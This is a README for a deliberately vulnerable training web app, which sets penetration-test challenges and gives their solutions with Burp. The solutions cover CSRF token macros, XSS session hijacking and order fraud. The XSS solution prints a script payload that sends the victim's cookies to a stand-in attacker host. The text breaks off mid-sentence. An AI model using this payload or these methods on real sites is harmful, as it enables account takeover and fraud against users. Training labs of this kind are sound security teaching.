[![Docker](https://github.com/BenjiTrapp/Project-Makalu/actions/workflows/docker-publish.yml/badge.svg)](https://github.com/BenjiTrapp/Project-Makalu/actions/workflows/docker-publish.yml)

<p align="center">
<img src="static/project-makalu.png">
</p>

### Project [Makalu](https://de.wikipedia.org/wiki/Makalu) 
In the course of the new online store of the **anna group** a new session handling is needed. The code presented here 
code is about to go live. In spite of the rapid development there are doubts whether
 something important has been forgotten?

### Motivation
Modern WebApps sometimes have an enormous complexity. In order to protect the customer from possible attacks, among other things, requests made to a WebApp require a login session. A request usually requires the data from a previous 
previous response (e.g. CSRF tokens). The data received in a partial request may also be needed some requests later, e.g. during checkout. 
such as during the checkout process. This makes the use of "unique" names/IDs during the creation of a request necessary. 
 
**Remark**: Fuzzing e.g. in the context of a CSRF token, generates a lot of data as well as calls within the WebApplication. This can affect the performance of the entire application in the event of an attack. The performance itself,
is NOT the focus of this penetration test, but can become a "problem" for the attack, depending on the chosen fuzzing method. 

## Problem Statement:
 Help the **anna group** to test the security of the session handling through a penetration test. To fulfill this request
 the application must first be installed and made operational. Here helps 
 the following instructions will certainly help:
 
## Install & launch the WebApp
1. using Docker
     ```bash
     $ docker pull ghcr.io/benjitrapp/project-makalu:main
     $ docker run -d -p 4711:4711 benjitrapp/project-makalu
     => open in browser: "http://localhost:4711"
     ```
2. Using Docker Compose
     ```bash
     1. pull Git repository from GitHub (git pull https://github.com/BenjiTrapp/Project-Makalu.git)
     2. change to the directory
     3. $ docker-compose up
     4. open in browser: ``http://localhost:4711``
     ```
3. locally in the IDE
     ```bash
     1. edit the file https://github.com/BenjiTrapp/Project-Makalu/blob/master/ProjectMakaluApp.py: 
            Change host in main method from 0.0.0.0 to 127.0.0.1. 2.
     2. start edited main method in IDE e.g. PyCharm
     ```

##### [Credentials](https://www.heise.de/security/meldung/hallo-ist-meistgenutztes-deutsches-Passwort-auf-Platz-zehn-steht-ficken-3579567.html): user/hallo

## Execution of the penetration test
The following use cases exist for the test. To perform the penetration test the file 
"/doc/Burp.burp-projectopts.json" can be loaded as a project using [Burp](https://portswigger.net/burp/freedownload/). 
can be loaded. The JSON file contains all session handling rules to solve the following challenges.
to solve. The challenges can of course also be solved with other tools such as OWASP ZAP.

#### Use Case: Build your own CSRF token
```
[Challenge]: The transmitted CSRF token must match and be transmitted with every POST request.

[Solution]:
* Capture the request from an existing CSRF token.
* Create a "Run a Macro" session handling rule
    * Scope the CSRF token parameters.
    * Update the CSRF token ONLY in the currently submitted request.
```

#### Use Case: Take over another user's session using [XSS gap](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)

```
[Challenge]: Find an input field that contains an XSS vulnerability and use it to hijack an unsuspecting victim's session.

[Solution]:
* Place inline JavaScript in a suitable location such as: 
    <script>window.location="http://evil.ru/?cookie=" + document.cookie;</script> 
* Extract the captured cookie from the request and take over the session. 
```

#### Use Case: Keep the login session open
```
[Challenge]: With a probability of 5%, WebApplications terminate the login session.

[Solution]:
* Capture the login request in a macro.
* Create a "Check Session is Valid" rule
    * Create a request
    * Check the response body for a username for the valid session
    * Alternatively, check the redirection of the login URL (the session must be invalid for this case)
    * Play the recorded macro when the session is invalidated
```
    
#### Use Case: commit order fraud 
```
[Challenge]: Perform multiple requests until the final order confirmation appears.

[Solution]:
* Perform all requests until one can be fuzzed using a macro.
* Finalize the order fraud with a "Run a Post-Request Macro", that will confirm the
